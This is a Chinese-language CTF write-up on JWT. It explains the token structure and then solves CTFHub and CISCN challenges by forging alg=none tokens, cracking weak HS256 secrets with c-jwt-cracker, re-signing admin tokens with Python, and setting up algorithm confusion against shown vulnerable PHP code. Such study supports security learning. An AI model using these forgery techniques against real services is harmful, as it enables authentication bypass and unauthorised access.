# JWT

[TOC]

----

![JWT（Json Web Token）とは？トークンのデータ構造と暗号化の仕組み。 │ Ugo](https://gitee.com/bx33661/image/raw/master/path/jwt-logo-1024x515.png)

JWT: https://jwt.io/#encoded-jwt

## 基本

> 摘抄资料

JWT（JSON Web Token）是一种基于JSON格式的紧凑、安全的方式，用于在各方之间传输信息，特别是用于身份验证和授权。JWT的主要特点包括以下几个方面：

### 1. 结构

JWT由三个部分组成，每部分之间用点（`.`）分隔：

- **Header（头部）**：通常包含两部分信息：令牌类型（即“JWT”）和所使用的签名算法（如HMAC SHA256或RSA）。

- **Payload（负载）**

  ：包含声明（Claims），这些声明是关于实体（通常是用户）及其他数据的。声明可以分为三类：

  - Registered Claims：预定义的声明，如`iss`（签发者），`exp`（过期时间），`sub`（主题），`aud`（受众）等。
  - Public Claims：用户自定义的声明，但应避免使用冲突的命名。
  - Private Claims：应用间共享的信息。

- **Signature（签名）**：签名是为了确保令牌未被篡改。它由编码后的头部和负载组合，并使用指定的签名算法加密形成。

### 2. 工作原理

1. **签发JWT**：当用户登录时，服务器会验证用户的身份，如果验证通过，服务器会生成一个JWT，其中包含用户的相关信息（如用户ID）。这个JWT会签名并发送给用户。
2. **客户端存储JWT**：客户端（通常是浏览器）会将这个JWT存储起来，通常存放在`localStorage`或`sessionStorage`中。
3. **客户端请求携带JWT**：当客户端向服务器发送请求时，会将JWT附加在HTTP请求的`Authorization`头部中（通常是`Bearer`模式）。
4. **服务器验证JWT**：服务器会验证JWT的签名，并检查它的有效性（如过期时间等）。如果验证通过，服务器会处理请求并返回响应。

















### 敏感信息泄露

> jwt一般是作为题目的一个部分，这种直接泄露信息的基本没有

```
eyJBRyI6Ijk1MGZjYzJiZGQyZjQ0MX0iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImJ4MzM2NjEiLCJwYXNzd29yZCI6InpieDEyMzQ1NiIsIkZMIjoiY3RmaHViezY3MjQ5YTA5ZCJ9.eNgGhgI2-Bf_txI0cGiS64HfDeErXt2p2mT5UA7E_zU
```

![image-20241026150303406](https://gitee.com/bx33661/image/raw/master/path/image-20241026150303406.png)

得到flag

```
ctfhub{67249a09d950fcc2bdd2f441}
```



### 无签名

> 题目提示：
>
> 一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。

进入页面，注册admin/123456,查看cookie

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ.MaphZVk25q4stXxAmEgXmKCW7aUo3jDJtgv9DwahLwc

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ
MaphZVk25q4stXxAmEgXmKCW7aUo3jDJtgv9DwahLwc
```

![image-20240827164720451](https://gitee.com/bx33661/image/raw/master/path/image-20240827164720451.png)

修改加密算法为`none`

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
```

修改权限为`admin`

```
eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ
```

最后的构造：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.
```

提交之后得到flag

```
Hello admin(admin), only admin can get flag.
ctfhub{72d9055351fb13a911387e5c}
```





### 弱密钥

> 对称密码

进入页面，注册admin/123456,查看cookie

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ.7KnITDRIAh7AyiR7ZdoqZPI7Dm0FfucDxLD5DRvLDdU.
```

![image-20240827170321755](https://gitee.com/bx33661/image/raw/master/path/image-20240827170321755.png)

安装一个工具`c-jwt-cracker`

```bash
git clone https://github.com/brendan-rius/c-jwt-cracker.git
sudo apt install gcc
sudo apt install make
#确保你已经安装openssl
sudo apt-get update
sudo apt-get install libssl-dev

make


#使用
./jwtcrack token
```

![image-20240827163718735](https://gitee.com/bx33661/image/raw/master/path/image-20240827163718735.png)

![image-20240827163928848](https://gitee.com/bx33661/image/raw/master/path/image-20240827163928848.png)

得到密钥是mqwr,修改JWT后得到

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiYWRtaW4ifQ.aontCOVinnmKgiIxqni6kFwghAcXzjSyK9ayfwG7gBc
```

![image-20240827164106654](https://gitee.com/bx33661/image/raw/master/path/image-20240827164106654.png)

得到flag

```
ctfhub{d458c74724065f3a63099b1c}
```



### 修改签名算法

> 题目提示：
>
> 有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。

进入页面发现`publickey.pem`

```ABAP
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3/YJZ/OAQFDwtltlGrvn
wwRtvPixoZPTdkx7Nsn8bahOhOneb0IyrcznZbLomhaRZ2pHXOBgrtkOS8IWST9G
/06b+3n/TblGVj/ACXwPAeRzXSGuGzai+dxqLES2Xok+EBm8N0g90mB4yY9EFQc/
BCLFgnIc0Ylcx1ov+Ai9cJLCibbJtzM11p/I0oKBXBF4PjweCnL+gASO4mS+F+TR
1QcNE0uqd0GNCG+kMzBtGIiX+ulXawKOpyQY4PDc0y5yJHFL5+FX/QvbaOnmZ90K
da6JpXOAyO493ezEqLearwJalronv7vtDwksMvJSExlYGxrvk0nT7Xm6M6ufjdBF
rwIDAQAB
-----END PUBLIC KEY-----
```

下面一行本环境的源码

```php+HTML
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <title>CTFHub JWTDemo</title>
        <link rel="stylesheet" href="/static/style.css" />
    </head>
    <body>
        <main id="content">
            <header>Web Login</header>
            <form id="login-form" method="POST">
                <input type="text" name="username" placeholder="Username" />
                <input type="password" name="password" placeholder="Password" />
                <input type="submit" name="action" value="Login" />
            </form>
            <a href="/publickey.pem">publickey.pem</a>
        </main>
        <?php echo $_COOKIE['token'];?>
        <hr/>
    </body>
</html>

<?php
require __DIR__ . '/vendor/autoload.php';
use \Firebase\JWT\JWT;

class JWTHelper {
  public static function encode($payload=array(), $key='', $alg='HS256') {
    return JWT::encode($payload, $key, $alg);
  }
  public static function decode($token, $key, $alg='HS256') {
    try{
            $header = JWTHelper::getHeader($token);
            $algs = array_merge(array($header->alg, $alg));
      return JWT::decode($token, $key, $algs);
    } catch(Exception $e){
      return false;
    }
    }
    public static function getHeader($jwt) {
        $tks = explode('.', $jwt);
        list($headb64, $bodyb64, $cryptob64) = $tks;
        $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));
        return $header;
    }
}

$FLAG = getenv("FLAG");
$PRIVATE_KEY = file_get_contents("/privatekey.pem");
$PUBLIC_KEY = file_get_contents("./publickey.pem");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        $token = "";
        if($_POST['username'] === 'admin' && $_POST['password'] === $FLAG){
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'admin',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        } else {
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'guest',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        }
        @setcookie("token", $token, time()+1800);
        header("Location: /index.php");
        exit();
    } else {
        @setcookie("token", "");
        header("Location: /index.php");
        exit();
    }
} else {
    if(!empty($_COOKIE['token']) && JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false) {
        $obj = JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY);
        if ($obj->role === 'admin') {
            echo $FLAG;
        }
    } else {
        show_source(__FILE__);
    }
}
?>
```

进入页面，注册admin/123456,查看cookie

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.wVLgMjzI-NnAeVTL4aMLuARJPJsizGuJc6wbP3dq5ExxlciEgcC3Ln2TU7pxSo8MV-MiofGd6lrBDXsBwTRUly4FiiMN1fOjRRQNZtVV4oEc1l9u21PxZt94uiMgePVK2U1nIqBZnl50HqCzqq4KH5M7zJiLKBBuYa9qr7y3uFmJYWIN2xKmi9xmQg1Ax2wnoGbXbtQWzex9mZ8nLjAWhulnhHbUlpYkiIKemoh23tR0PHbYlHxjAkQQdLJbxYv4RDMx80wrGHbbhSRRjn9_9ZVp06coL37VXr2heDokutzl_-5iFtPV51vJLMzBWyx4NUqELjzlW45GF1LXuPhcSg
```

![image-20240827170553593](https://gitee.com/bx33661/image/raw/master/path/image-20240827170553593.png)



### [CISCN2019 华北赛区 Day1 Web2]ikun

> 其中一步

访问`/b1g_m4mber`

提示需要admin才能访问，我们之前观察到的cookie里面的jwt，我们现在使用`c-jwtcrack`爆破这个密钥---------------> ·1Kun·

![image-20241026144241906](https://gitee.com/bx33661/image/raw/master/path/image-20241026144241906.png)

```python
import jwt

# 泄露的密钥
secret_key = "1Kun"

# 载荷数据
payload = {
    "username": "admin"
}

# 生成JWT
new_token = jwt.encode(payload, secret_key, algorithm="HS256")
print("新生成的JWT:", new_token)
```

加密:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
```

进入页面寻找线索：



## 脚本工具

JWT在线网站：**https://jwt.io/#encoded-jwt**

### jwt编码与解码脚本

编码--->

```python
import jwt

# 泄露的密钥
secret_key = "1Kun"

# 载荷数据
payload = {
    "username": "admin"
}

# 生成JWT
new_token = jwt.encode(payload, secret_key, algorithm="HS256")
print("新生成的JWT:", new_token)
```

解码--->

```python
import jwt

# JWT密钥
secret_key = ""

# JWT令牌
jwt_token = ""

try:
    # 解密JWT
    decoded_payload = jwt.decode(jwt_token, secret_key, algorithms=["HS256"])
    print("解密后的载荷:", decoded_payload)
except jwt.ExpiredSignatureError:
    print("JWT已过期")
except jwt.InvalidTokenError:
    print("无效的JWT")
```



`c-jwt-cracker`工具

> A multi-threaded JWT brute-force cracker written in C. If you are very lucky or have a huge computing power, this program should find the secret key of a JWT token, allowing you to forge valid tokens. This is for testing purposes only, do not put yourself in trouble :)

```python
git clone https://github.com/brendan-rius/c-jwt-cracker.git
sudo apt install gcc
sudo apt install make
#确保你已经安装openssl
sudo apt-get update
sudo apt-get install libssl-dev

make


#使用
./jwtcrack token
```

